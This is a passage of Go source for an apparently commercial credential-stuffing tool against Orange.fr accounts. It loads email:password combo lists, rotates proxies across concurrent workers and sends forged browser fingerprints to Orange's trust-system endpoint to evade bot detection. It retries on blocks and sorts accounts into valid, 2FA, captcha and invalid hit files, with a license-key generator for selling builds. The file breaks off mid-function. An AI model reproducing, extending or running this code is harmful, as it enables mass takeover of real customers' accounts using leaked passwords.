// Orange.fr IDME login via HTTP only (no browser).
//
// Usage:
//
//	go run .
//
// Reads email:password combos from combos.txt (one per line).
// Requires PROXY, LICENSE_KEY, and WORKER_COUNT in .env.
package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	base       = "https://login.orange.fr"
	combosFile = "combos.txt"
	resultDir  = "result"
	validFile          = "result/valid.txt"
	changePasswordFile = "result/change_password.txt"
	invalidFile        = "result/invalid.txt"
	limitedFile        = "result/limited.txt"
	captchaFile   = "result/captcha.txt"
	twofaFile     = "result/2fa.txt"
	envFile   = ".env"

	requestMaxRetries = 2
	requestRetryDelay = 300 * time.Millisecond
	comboRetrySecurity = 100
	maxSameIPTry      = 100
)

var (
	workerCount     int
	sessionPoolSize int
)

var idzoneJSRE = regexp.MustCompile(`https://iz\.orange\.fr/[^"']+idzone\.js`)

type log struct {
	mu    sync.Mutex
	quiet bool
}

func newLog() *log {
	enableWindowsANSI()
	return &log{}
}

func quietLog() *log {
	return &log{quiet: true}
}

func (l *log) emit(s string) {
	if l == nil || l.quiet {
		return
	}
	l.mu.Lock()
	defer l.mu.Unlock()
	fmt.Print(s)
}

func (l *log) print(format string, args ...interface{}) {
	l.emit(fmt.Sprintf(format, args...))
}

const (
	cReset  = "\033[0m"
	cBold   = "\033[1m"
	cRed    = "\033[91m"
	cGreen  = "\033[92m"
	cYellow = "\033[93m"
	cBlue   = "\033[94m"
	cCyan    = "\033[96m"
	cGray    = "\033[90m"
	cWhite   = "\033[97m"
	cMagenta = "\033[95m"
)

func enableWindowsANSI() {
	if runtime.GOOS != "windows" {
		return
	}
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	getStdHandle := kernel32.NewProc("GetStdHandle")
	getConsoleMode := kernel32.NewProc("GetConsoleMode")
	setConsoleMode := kernel32.NewProc("SetConsoleMode")

	const (
		stdOutputHandle              = uintptr(0xFFFFFFF5) // -11
		enableVirtualTerminalProcessing = 0x0004
	)

	handle, _, _ := getStdHandle.Call(stdOutputHandle)
	if handle == 0 {
		return
	}
	var mode uint32
	if r, _, _ := getConsoleMode.Call(handle, uintptr(unsafe.Pointer(&mode))); r == 0 {
		return
	}
	mode |= enableVirtualTerminalProcessing
	_, _, _ = setConsoleMode.Call(handle, uintptr(mode))
}

func statusCodeStr(code int) string {
	if code == 0 {
		return "-"
	}
	return fmt.Sprintf("%d", code)
}

func (l *log) progressLine(checked, total int64, elapsedSec, cpm int, counts runCounts, final bool) {
	hits := counts.valid + counts.changePW
	colored := fmt.Sprintf(
		"%s%d/%d%s | %s%ds%s | %sCPM: %d%s | %sHITS: %d%s | %s2FA: %d%s | %sFAILS: %d%s | %sCAPTCHA: %d%s | %sLIMITED: %d%s",
		cCyan+cBold, checked, total, cReset,
		cYellow, elapsedSec, cReset,
		cYellow+cBold, cpm, cReset,
		cGreen+cBold, hits, cReset,
		cBlue+cBold, counts.twofa, cReset,
		cRed+cBold, counts.invalid, cReset,
		cYellow+cBold, counts.captcha, cReset,
		cCyan+cBold, counts.limited, cReset,
	)
	l.mu.Lock()
	defer l.mu.Unlock()
	if l.quiet {
		return
	}
	if final {
		fmt.Printf("\r%s%s\n", colored, cReset)
	} else {
		fmt.Printf("\r%s%s", colored, cReset)
	}
}

func (l *log) step(name string) {
	l.print("%s%s[STEP] %s%s\n", cCyan, cBold, name, cReset)
}

func (l *log) ok(msg string) {
	l.print("%s[OK]   %s%s\n", cGreen, msg, cReset)
}

func (l *log) warn(msg string) {
	l.print("%s[WARN] %s%s\n", cYellow, msg, cReset)
}

func (l *log) fail(msg string) {
	l.print("%s[FAIL] %s%s\n", cRed, msg, cReset)
}

func (l *log) info(msg string) {
	l.print("%s       %s%s\n", cGray, msg, cReset)
}

func loadRunCounts(counts *runCounts) runCounts {
	return runCounts{
		valid:    atomic.LoadInt64(&counts.valid),
		changePW: atomic.LoadInt64(&counts.changePW),
		invalid:  atomic.LoadInt64(&counts.invalid),
		limited:  atomic.LoadInt64(&counts.limited),
		captcha:  atomic.LoadInt64(&counts.captcha),
		twofa:    atomic.LoadInt64(&counts.twofa),
	}
}

func (l *log) startupHeader() {
	l.print("\n%s%s┌─ orange.fr checker ─────────────────────┐%s\n", cCyan, cBold, cReset)
}

func (l *log) startupFooter() {
	l.print("%s%s└──────────────────────────────────────────┘%s\n\n", cCyan, cBold, cReset)
}

func (l *log) startup(key, value, keyColor, valueColor string) {
	if valueColor == "" {
		l.print("  %s%s%-10s%s %s%s\n", keyColor, cBold, key, cReset, value, cReset)
		return
	}
	l.print("  %s%s%-10s%s %s%s%s\n", keyColor, cBold, key, cReset, valueColor, value, cReset)
}

func (l *log) result(label string, status int, nextStep string, detail string) {
	plain := fmt.Sprintf("[%s] HTTP %d | nextStep=%s", label, status, nextStep)
	if detail != "" {
		plain += " | " + detail
	}

	good := (label == "ACCESS" && status == 200 && nextStep == "login") ||
		(label == "LOGIN" && status == 200 && nextStep == "password") ||
		(label == "PASSWORD" && status == 200 && nextStep == "redirect")

	bad := status >= 400 || nextStep == "feedback" ||
		(label == "LOGIN" && nextStep == "login" && status != 200) ||
		(label == "PASSWORD" && nextStep == "password" && status == 401)

	color := cYellow
	if good {
		color = cGreen
	} else if bad {
		color = cRed
	}
	l.print("%s%s%s\n", color, plain, cReset)
}

func asMap(v interface{}) map[string]interface{} {
	m, _ := v.(map[string]interface{})
	return m
}

func asString(v interface{}) string {
	s, _ := v.(string)
	return s
}

func asSlice(v interface{}) []interface{} {
	s, _ := v.([]interface{})
	return s
}

func extractError(data map[string]interface{}) string {
	dataField := asMap(data["data"])
	if dataField == nil {
		return ""
	}

	screen := asMap(dataField["passwordScreen"])
	if screen == nil {
		screen = asMap(dataField["loginScreen"])
	}
	if screen == nil {
		screen = asMap(dataField["feedbackScreen"])
	}
	if screen == nil {
		screen = map[string]interface{}{}
	}

	if err := asMap(screen["error"]); err != nil {
		if msg := asString(err["message"]); msg != "" {
			return msg
		}
	}
	if loginField := asMap(screen["loginField"]); loginField != nil {
		if err := asMap(loginField["error"]); err != nil {
			if msg := asString(err["message"]); msg != "" {
				return msg
			}
		}
	}
	if alert := asMap(screen["inPageAlert"]); alert != nil {
		if texts := asSlice(alert["text"]); len(texts) > 0 {
			if t := asString(texts[0]); t != "" {
				return t
			}
		}
	}
	if loc := asString(dataField["location"]); loc != "" {
		return "redirect -> " + loc
	}
	return ""
}

func englishAPIError(msg string) string {
	msg = strings.TrimSpace(msg)
	if msg == "" {
		return ""
	}
	lower := strings.ToLower(msg)
	switch {
	case strings.Contains(lower, "saisie du mot de passe est temporairement suspendue"):
		return "Password entry temporarily suspended for security reasons"
	case strings.Contains(lower, "mot de passe est incorrect"),
		strings.Contains(lower, "mot de passe incorrect"),
		strings.Contains(lower, "identifiant ou mot de passe"):
		return "Wrong email or password"
	case strings.Contains(lower, "compte n'existe pas"),
		strings.Contains(lower, "compte inconnu"):
		return "Account does not exist"
	case strings.Contains(lower, "identifiant inconnu"):
		return "Unknown email address"
	case strings.Contains(lower, "captcha"):
		return "Captcha challenge required"
	case strings.Contains(lower, "trop de tentatives"):
		return "Too many attempts — temporarily blocked"
	case strings.HasPrefix(msg, "redirect -> "):
		loc := strings.TrimPrefix(msg, "redirect -> ")
		if strings.Contains(strings.ToLower(loc), "captcha") {
			return "Redirected to captcha: " + loc
		}
		if strings.Contains(loc, "Oerreur_403") {
			return "Blocked by Orange (403 error page)"
		}
		return "Redirected to: " + loc
	case strings.Contains(lower, "server error retry exhausted"):
		return msg
	case strings.Contains(lower, "security block retry exhausted"):
		return msg
	case strings.Contains(lower, "captcha retry exhausted"):
		return msg
	case strings.Contains(lower, "login block retry exhausted"):
		return msg
	case strings.Contains(lower, "cookie capture failed"):
		if isOrange403Block(msg) {
			return "Post-login redirect blocked (403) — cookies not captured"
		}
		return msg
	case strings.Contains(lower, "session pool stopped"):
		return "No ready session available in pool"
	default:
		return msg
	}
}

func englishStepDetail(step string, loginStatus, passStatus int) string {
	switch step {
	case "password":
		if passStatus == 401 {
			return "Wrong password"
		}
		if passStatus == 403 {
			return "Password entry temporarily blocked"
		}
		return "Stopped at password step (HTTP " + statusCodeStr(passStatus) + ")"
	case "login":
		if loginStatus == 401 {
			return "Unknown email or invalid login"
		}
		if isServerError(loginStatus) {
			return fmt.Sprintf("Login server error (HTTP %d)", loginStatus)
		}
		return "Login did not advance to password step"
	case "feedback":
		return "Login rejected — feedback error screen"
	case "redirect":
		return "Redirected (possible captcha or security check)"
	case "mobileConnect", "authnByApp":
		return "Two-factor authentication required"
	case "promoteAccess":
		return "Password change required"
	case "remoteAccounts":
		return "Remote accounts step — login blocked"
	default:
		if step == "" {
			return "No next step returned by API"
		}
		return "Unexpected API step: " + step
	}
}

func apiDetail(data map[string]interface{}, step string, status int) string {
	if msg := extractError(data); msg != "" {
		return englishAPIError(msg)
	}
	return englishStepDetail(step, status, 0)
}

func serverErrorDetail(phase string, status int, data map[string]interface{}) string {
	if msg := extractError(data); msg != "" {
		if translated := englishAPIError(msg); translated != "" {
			return fmt.Sprintf("%s server error (HTTP %d): %s", phase, status, translated)
		}
	}
	return fmt.Sprintf("%s server error (HTTP %d)", phase, status)
}

func (r comboResult) displayLabel() string {
	return r.label
}

func (r comboResult) englishDetail() string {
	if isServerErrorResult(r) {
		if r.detail != "" {
			return r.detail
		}
		if isServerError(r.loginStatus) {
			return fmt.Sprintf("Login server error (HTTP %d)", r.loginStatus)
		}
		return fmt.Sprintf("Password server error (HTTP %d)", r.passStatus)
	}

	if r.detail != "" {
		if strings.HasPrefix(r.detail, "nextStep=") {
			step := strings.TrimPrefix(r.detail, "nextStep=")
			return englishStepDetail(step, r.loginStatus, r.passStatus)
		}
		if translated := englishAPIError(r.detail); translated != "" {
			switch r.label {
			case "INVALID":
				if r.credentialIssue && r.passStatus == 401 {
					if translated == "Wrong email or password" {
						return "Wrong password"
					}
					return "Wrong password — " + translated
				}
				if r.loginStatus == 401 {
					if translated == "Wrong email or password" {
						return "Unknown email or invalid login"
					}
					return "Unknown email or invalid login — " + translated
				}
			case "LIMITED":
				return translated
			case "CAPTCHA", "PROXY", "2FA", "CHANGE_PW", "VALID":
				return translated
			default:
				return translated
			}
		}
	}

	switch r.label {
	case "VALID":
		if r.detail != "" {
			return englishAPIError(r.detail)
		}
		return "Login successful"
	case "LIMITED":
		if r.detail != "" {
			return englishAPIError(r.detail)
		}
		return "Password entry temporarily blocked (HTTP 403)"
	case "INVALID":
		if r.credentialIssue && r.passStatus == 401 {
			return "Wrong password"
		}
		if r.loginStatus == 401 {
			return "Unknown email or invalid login"
		}
		return "Invalid credentials or login rejected"
	case "2FA":
		return "Two-factor authentication required"
	case "CHANGE_PW":
		return "Password change required before access"
	case "CAPTCHA", "PROXY":
		if r.detail != "" {
			return englishAPIError(r.detail)
		}
		return "Blocked by Orange security check"
	}

	if r.detail != "" {
		return englishAPIError(r.detail)
	}
	return "Unknown result"
}

func newUUID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}

func uuidHex() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

func randIntn(n int) int {
	if n <= 0 {
		return 0
	}
	var b [4]byte
	_, _ = rand.Read(b[:])
	return int(binary.BigEndian.Uint32(b[:]) % uint32(n))
}

func randIntRange(min, max int) int {
	if max <= min {
		return min
	}
	return min + randIntn(max-min+1)
}

func loadDotEnv(path string) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		key, val, ok := strings.Cut(line, "=")
		if !ok {
			continue
		}
		key = strings.TrimSpace(key)
		val = strings.TrimSpace(val)
		val = strings.Trim(val, `"'`)
		if os.Getenv(key) == "" {
			os.Setenv(key, val)
		}
	}
	return scanner.Err()
}

func proxySpecFromEnv() (string, error) {
	if err := loadDotEnv(envFile); err != nil {
		return "", fmt.Errorf("load %s: %w", envFile, err)
	}
	spec := strings.TrimSpace(os.Getenv("PROXY"))
	if spec == "" {
		return "", fmt.Errorf("PROXY is not set in %s", envFile)
	}
	return spec, nil
}

func workersFromEnv() (int, error) {
	if err := loadDotEnv(envFile); err != nil {
		return 0, fmt.Errorf("load %s: %w", envFile, err)
	}
	raw := strings.TrimSpace(os.Getenv("WORKER_COUNT"))
	if raw == "" {
		return 0, fmt.Errorf("WORKER_COUNT is not set in %s", envFile)
	}
	n, err := strconv.Atoi(raw)
	if err != nil || n < 1 {
		return 0, fmt.Errorf("WORKER_COUNT must be a positive integer")
	}
	return n, nil
}

const (
	licenseKeyLen     = 64
	licensePayloadLen = 32
	// Change this before distributing builds you sign keys for.
	licenseSecret = "orange-fr-checker-license-secret-v1"
)

var tokyoLoc *time.Location

func init() {
	loc, err := time.LoadLocation("Asia/Tokyo")
	if err != nil {
		tokyoLoc = time.FixedZone("JST", 9*3600)
		return
	}
	tokyoLoc = loc
}

func licenseMAC(expiryUnix int64) []byte {
	h := hmac.New(sha256.New, []byte(licenseSecret))
	var buf [8]byte
	binary.BigEndian.PutUint64(buf[:], uint64(expiryUnix))
	_, _ = h.Write(buf[:])
	return h.Sum(nil)[:28]
}

func encodeLicenseKey(expiryUnix int64) string {
	payload := make([]byte, licensePayloadLen)
	binary.BigEndian.PutUint32(payload[0:4], uint32(expiryUnix))
	copy(payload[4:], licenseMAC(expiryUnix))
	return hex.EncodeToString(payload)
}

func decodeLicenseKey(key string) (int64, error) {
	key = strings.ToLower(strings.TrimSpace(key))
	if len(key) != licenseKeyLen {
		return 0, fmt.Errorf("license key must be %d characters", licenseKeyLen)
	}
	payload, err := hex.DecodeString(key)
	if err != nil || len(payload) != licensePayloadLen {
		return 0, errors.New("invalid license key format")
	}

	expiryUnix := int64(binary.BigEndian.Uint32(payload[0:4]))
	if !hmac.Equal(payload[4:], licenseMAC(expiryUnix)) {
		return 0, errors.New("license key is invalid")
	}
	return expiryUnix, nil
}

func parseExpiryTokyo(args []string) (time.Time, error) {
	if len(args) == 0 {
		return time.Time{}, errors.New("expiry date is required")
	}
	if len(args) > 1 {
		return time.Time{}, errors.New("only a date is accepted (YYYY-MM-DD)")
	}

	date := strings.TrimSpace(args[0])
	expires, err := time.ParseInLocation("2006-01-02", date, tokyoLoc)
	if err != nil {
		return time.Time{}, fmt.Errorf("parse expiry (Tokyo): %w", err)
	}
	return time.Date(expires.Year(), expires.Month(), expires.Day(), 23, 59, 59, 0, tokyoLoc), nil
}

func generateLicenseKey(expiresTokyo time.Time) string {
	inTokyo := expiresTokyo.In(tokyoLoc)
	expiryUnix := time.Date(
		inTokyo.Year(), inTokyo.Month(), inTokyo.Day(),
		inTokyo.Hour(), inTokyo.Minute(), inTokyo.Second(), 0, tokyoLoc,
	).Unix()
	return encodeLicenseKey(expiryUnix)
}

func validateLicenseKey(key string) (time.Time, error) {
	expiryUnix, err := decodeLicenseKey(key)
	if err != nil {
		return time.Time{}, err
	}

	expiry := time.Unix(expiryUnix, 0).In(tokyoLoc)
	now := time.Now().In(tokyoLoc)
	if !now.Before(expiry) {
		return expiry, fmt.Errorf(
			"license expired at %s UTC",
			expiry.UTC().Format("2006-01-02 15:04:05"),
		)
	}
	return expiry, nil
}

func isLicenseGenBinary() bool {
	base := strings.ToLower(strings.TrimSuffix(filepath.Base(os.Args[0]), ".exe"))
	return base == "licensegen"
}

func printLicenseGenUsage() {
	fmt.Fprintln(os.Stderr, "usage:")
	fmt.Fprintln(os.Stderr, "  licensegen")
	fmt.Fprintln(os.Stderr, "  licensegen <YYYY-MM-DD>")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "Date is interpreted as Asia/Tokyo (JST), valid until 23:59:59 that day.")
}

func promptTokyoExpiry() ([]string, error) {
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("License expiry date (Asia/Tokyo / JST)")
	fmt.Print("YYYY-MM-DD: ")
	date, err := reader.ReadString('\n')
	if err != nil {
		return nil, fmt.Errorf("read date: %w", err)
	}
	date = strings.TrimSpace(date)
	if date == "" {
		return nil, errors.New("date is required")
	}
	return []string{date}, nil
}

func printGeneratedLicenseKey(key string, expiresTokyo time.Time) {
	expiresTokyo = expiresTokyo.In(tokyoLoc)
	fmt.Println()
	fmt.Printf("expiry (Tokyo): %s\n", expiresTokyo.Format("2006-01-02 15:04:05 MST"))
	fmt.Printf("expiry (UTC):   %s\n", expiresTokyo.UTC().Format("2006-01-02 15:04:05 UTC"))
	fmt.Printf("license key:    %s\n", key)
	fmt.Println()
}

func runLicenseGenCLI() {
	args := os.Args[1:]
	if len(args) == 0 {
		var err error
		args, err = promptTokyoExpiry()
		if err != nil {
			fmt.Fprintln(os.Stderr, err.Error())
			printLicenseGenUsage()
			os.Exit(2)
		}
	}

	expires, err := parseExpiryTokyo(args)
	if err != nil {
		fmt.Fprintln(os.Stderr, err.Error())
		printLicenseGenUsage()
		os.Exit(2)
	}

	printGeneratedLicenseKey(generateLicenseKey(expires), expires)
}

func licenseKeyFromEnv() (string, error) {
	if err := loadDotEnv(envFile); err != nil {
		return "", err
	}
	key := strings.TrimSpace(os.Getenv("LICENSE_KEY"))
	if key == "" {
		return "", fmt.Errorf("LICENSE_KEY is not set in %s", envFile)
	}
	return key, nil
}

func requireLicense(l *log) error {
	key, err := licenseKeyFromEnv()
	if err != nil {
		return err
	}
	expiry, err := validateLicenseKey(key)
	if err != nil {
		return err
	}
	l.startup(
		"license",
		"valid until "+expiry.UTC().Format("2006-01-02 15:04:05")+" UTC",
		cGreen,
		cWhite,
	)
	return nil
}

func checkProxy(proxy *url.URL) (string, error) {
	if proxy == nil {
		return "", fmt.Errorf("PROXY is not configured")
	}

	client := &http.Client{
		Transport: newSharedTransport(proxy),
		Timeout:   15 * time.Second,
	}

	req, err := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
	if err != nil {
		return "", err
	}
	newBrowserProfile().applyHeaders(req.Header)

	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("connection failed: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusProxyAuthRequired {
		return "", fmt.Errorf("authentication failed (HTTP 407)")
	}
	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 256))
		msg := strings.TrimSpace(string(body))
		if msg != "" {
			return "", fmt.Errorf("HTTP %d: %s", resp.StatusCode, msg)
		}
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %v", err)
	}
	ip := strings.TrimSpace(string(body))
	if ip == "" {
		return "", fmt.Errorf("empty response from proxy check")
	}
	return ip, nil
}

func requireProxy(l *log) (*url.URL, error) {
	spec, err := proxySpecFromEnv()
	if err != nil {
		return nil, err
	}
	proxy, err := parseProxyURL(spec)
	if err != nil {
		return nil, err
	}
	ip, err := checkProxy(proxy)
	if err != nil {
		return nil, err
	}
	l.startup("proxy", fmt.Sprintf("%s (%s)", proxy.Host, ip), cBlue, cWhite)
	return proxy, nil
}

func parseProxyURL(spec string) (*url.URL, error) {
	if spec == "" {
		return nil, nil
	}

	if u, err := url.Parse(spec); err == nil && u.User != nil {
		return u, nil
	}

	scheme := "http"
	rest := spec
	if i := strings.Index(spec, "://"); i >= 0 {
		scheme = spec[:i]
		rest = spec[i+3:]
	}

	parts := strings.SplitN(rest, ":", 4)
	if len(parts) != 4 {
		return url.Parse(spec)
	}

	host, port, user, pass := parts[0], parts[1], parts[2], parts[3]
	return &url.URL{
		Scheme: scheme,
		User:   url.UserPassword(user, pass),
		Host:   net.JoinHostPort(host, port),
	}, nil
}

type accessResult struct {
	nextStep string
	detail   string
	status   int
}

type orangeHTTPSession struct {
	log      *log
	client   *http.Client
	identity sessionIdentity
	proxyIP  string
	ipMu     sync.Mutex
}

func newSharedTransport(proxy *url.URL) *http.Transport {
	t := &http.Transport{
		MaxIdleConns:          workerCount * 4,
		MaxIdleConnsPerHost:   workerCount,
		MaxConnsPerHost:       0,
		IdleConnTimeout:       90 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 20 * time.Second,
		ForceAttemptHTTP2:     true,
	}
	if proxy != nil {
		t.Proxy = http.ProxyURL(proxy)
	}
	return t
}

func newOrangeHTTPSession(l *log, transport *http.Transport) (*orangeHTTPSession, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, err
	}

	s := &orangeHTTPSession{
		log:      l,
		identity: newSessionIdentity(),
		client: &http.Client{
			Jar:       jar,
			Transport: transport,
			Timeout:   20 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
	s.startIPLookup()
	return s, nil
}

func (s *orangeHTTPSession) startIPLookup() {
	go func() {
		ip, err := s.lookupIP()
		if err != nil {
			return
		}
		s.ipMu.Lock()
		s.proxyIP = ip
		s.ipMu.Unlock()
	}()
}

func (s *orangeHTTPSession) getProxyIP() string {
	s.ipMu.Lock()
	defer s.ipMu.Unlock()
	return s.proxyIP
}

func (s *orangeHTTPSession) lookupIP() (string, error) {
	req, err := http.NewRequest("GET", "https://api.ipify.org?format=text", nil)
	if err != nil {
		return "", err
	}
	resp, err := s.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(raw)), nil
}

func isRetryableNetErr(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, io.EOF) || errors.Is(err, io.ErrUnexpectedEOF) ||
		errors.Is(err, context.DeadlineExceeded) || errors.Is(err, context.Canceled) {
		return true
	}
	var netErr net.Error
	if errors.As(err, &netErr) {
		return true
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "eof") ||
		strings.Contains(msg, "connection reset") ||
		strings.Contains(msg, "broken pipe") ||
		strings.Contains(msg, "timeout") ||
		strings.Contains(msg, "connection refused") ||
		strings.Contains(msg, "no such host") ||
		strings.Contains(msg, "tls:")
}

func isRetryableHTTPStatus(status int, rawURL string) bool {
	return status == 403 && strings.Contains(rawURL, "/api/login")
}

func (s *orangeHTTPSession) request(
	method, rawURL string,
	headers map[string]string,
	jsonBody map[string]interface{},
	form url.Values,
) (int, http.Header, string, error) {
	reqHeaders := http.Header{}
	s.identity.profile.applyHeaders(reqHeaders)
	for k, v := range headers {
		reqHeaders.Set(k, v)
	}

	var bodyBytes []byte
	if form != nil {
		reqHeaders.Set("Content-Type", "application/x-www-form-urlencoded")
		bodyBytes = []byte(form.Encode())
	} else if jsonBody != nil {
		b, err := json.Marshal(jsonBody)
		if err != nil {
			return 0, nil, "", err
		}
		reqHeaders.Set("Content-Type", "application/json")
		bodyBytes = b
	}

	var lastErr error
	for attempt := 0; attempt <= requestMaxRetries; attempt++ {
		if attempt > 0 {
			s.log.warn(fmt.Sprintf("retry %d/%d %s %s: %v", attempt, requestMaxRetries, method, rawURL, lastErr))
			time.Sleep(requestRetryDelay)
		}

		var body io.Reader
		if bodyBytes != nil {
			body = bytes.NewReader(bodyBytes)
		}

		req, err := http.NewRequest(method, rawURL, body)
		if err != nil {
			return 0, nil, "", err
		}
		req.Header = reqHeaders.Clone()

		resp, err := s.client.Do(req)
		if err != nil {
			lastErr = err
			if isRetryableNetErr(err) && attempt < requestMaxRetries {
				continue
			}
			return 0, nil, "", err
		}

		raw, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			lastErr = err
			if isRetryableNetErr(err) && attempt < requestMaxRetries {
				continue
			}
			return resp.StatusCode, resp.Header, "", err
		}
		if isRetryableHTTPStatus(resp.StatusCode, rawURL) && attempt < requestMaxRetries {
			lastErr = fmt.Errorf("HTTP %d", resp.StatusCode)
			continue
		}
		return resp.StatusCode, resp.Header, string(raw), nil
	}
	return 0, nil, "", lastErr
}

func (s *orangeHTTPSession) access() (accessResult, error) {
	status, _, body, err := s.request(
		"POST",
		base+"/api/access",
		map[string]string{
			"Accept":           "application/json",
			"x-requested-with": "idme",
			"Referer":          base + "/",
		},
		map[string]interface{}{},
		nil,
	)
	if err != nil {
		return accessResult{}, err
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		return accessResult{}, err
	}
	detail := extractError(data)
	nextStep := asString(data["nextStep"])
	s.log.result("ACCESS", status, nextStep, detail)
	if status != 200 {
		return accessResult{}, fmt.Errorf("/api/access failed: %d", status)
	}
	if nextStep == "login" {
		s.log.ok("session ready (xauth)")
	}
	return accessResult{nextStep: nextStep, detail: detail, status: status}, nil
}

func (s *orangeHTTPSession) bootstrap() error {
	s.log.step("Bootstrap")
	s.log.info("identity " + s.identity.summary())

	_, _, html, err := s.request("GET", base+"/", nil, nil, nil)
	if err != nil {
		return err
	}

	match := idzoneJSRE.FindString(html)
	if match == "" {
		return fmt.Errorf("idzone.js URL not found")
	}
	_, _, _, err = s.request("GET", match, map[string]string{"Referer": base + "/"}, nil, nil)
	if err != nil {
		return err
	}
	s.log.ok("idzone cookies")

	fp := s.identity.trustFingerprint()
	compareFingerprint(s.log, fp)
	fpJSON, err := json.Marshal(fp)
	if err != nil {
		return err
	}
	form := url.Values{
		"data":      {string(fpJSON)},
		"eventHits": {"{}"},
		"referer":   {""},
		"request":   {"/"},
		"sid":       {s.identity.sid},
		"version":   {trustVersion},
		"service":   {"idme"},
		"uuid":      {s.identity.fpUUID},
		"step":      {"init"},
	}
	_, _, _, err = s.request(
		"POST",
		"https://trust-system-eui.orange.fr/trust",
		map[string]string{"Referer": base + "/"},
		nil,
		form,
	)
	if err != nil {
		return err
	}
	s.log.ok("trust cookie")
	return nil
}

func (s *orangeHTTPSession) idmeAPIHeaders() map[string]string {
	return map[string]string{
		"Accept":           "application/json",
		"x-requested-with": "idme",
		"Referer":          base + "/",
		"Origin":           base,
		"Sec-Fetch-Site":   "same-origin",
		"Sec-Fetch-Mode":   "cors",
		"Sec-Fetch-Dest":   "empty",
	}
}

func (s *orangeHTTPSession) login(email string) (int, map[string]interface{}) {
	s.log.step("Login: " + email)
	status, _, body, err := s.request(
		"POST",
		base+"/api/login",
		s.idmeAPIHeaders(),
		map[string]interface{}{"login": email},
		nil,
	)
	if err != nil {
		return 0, map[string]interface{}{"error": err.Error()}
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		data = map[string]interface{}{"raw": body}
	}
	detail := extractError(data)
	s.log.result("LOGIN", status, asString(data["nextStep"]), detail)
	return status, data
}

func (s *orangeHTTPSession) password(pwd string) (int, map[string]interface{}) {
	s.log.step("Password")
	status, _, body, err := s.request(
		"POST",
		base+"/api/password",
		s.idmeAPIHeaders(),
		map[string]interface{}{"password": pwd},
		nil,
	)
	if err != nil {
		return 0, map[string]interface{}{"error": err.Error()}
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(body), &data); err != nil {
		data = map[string]interface{}{"raw": body}
	}
	detail := extractError(data)
	s.log.result("PASSWORD", status, asString(data["nextStep"]), detail)
	return status, data
}

func (s *orangeHTTPSession) navigateHeaders(referer string) map[string]string {
	if referer == "" {
		referer = base + "/"
	}
	site := "same-origin"
	if strings.Contains(referer, "login.orange.fr") {
		site = "cross-site"
	}
	return map[string]string{
		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
		"Upgrade-Insecure-Requests": "1",
		"Sec-Fetch-Site":            site,
		"Sec-Fetch-Mode":            "navigate",
		"Sec-Fetch-User":            "?1",
		"Sec-Fetch-Dest":            "document",
		"Referer":                   referer,
	}
}

func resolveRedirectURL(current, location string) (string, error) {
	if location == "" {
		return "", fmt.Errorf("empty redirect location")
	}
	if strings.HasPrefix(location, "http://") || strings.HasPrefix(location, "https://") {
		return location, nil
	}
	baseURL, err := url.Parse(current)
	if err != nil {
		return "", err
	}
	ref, err := baseURL.Parse(location)
	if err != nil {
		return "", err
	}
	return ref.String(), nil
}

func (s *orangeHTTPSession) followRedirectChain(startURL string) (finalURL string, hops []string, err error) {
	current := startURL
	hops = []string{startURL}
	referer := base + "/"
	for i := 0; i < 8; i++ {
		code, hdrs, _, reqErr := s.request("GET", current, s.navigateHeaders(referer), nil, nil)
		if reqErr != nil {
			return current, hops, reqErr
		}
		if code >= 300 && code < 400 {
			next, parseErr := resolveRedirectURL(current, hdrs.Get("Location"))
			if parseErr != nil {
				return current, hops, parseErr
			}
			referer = current
			current = next
			hops = append(hops, next)
			continue
		}
		if code >= 200 && code < 300 {
			return current, hops, nil
		}
		return current, hops, fmt.Errorf("redirect chain stopped at HTTP %d for %s", code, current)
	}
	return current, hops, nil
}

func wassupExpirationDate(value string) *float64 {
	idx := strings.Index(value, "X_WASSUP_VALID_DATE=")
	if idx < 0 {
		return nil
	}
	raw := value[idx+len("X_WASSUP_VALID_DATE="):]
	if cut := strings.IndexAny(raw, "|"); cut >= 0 {
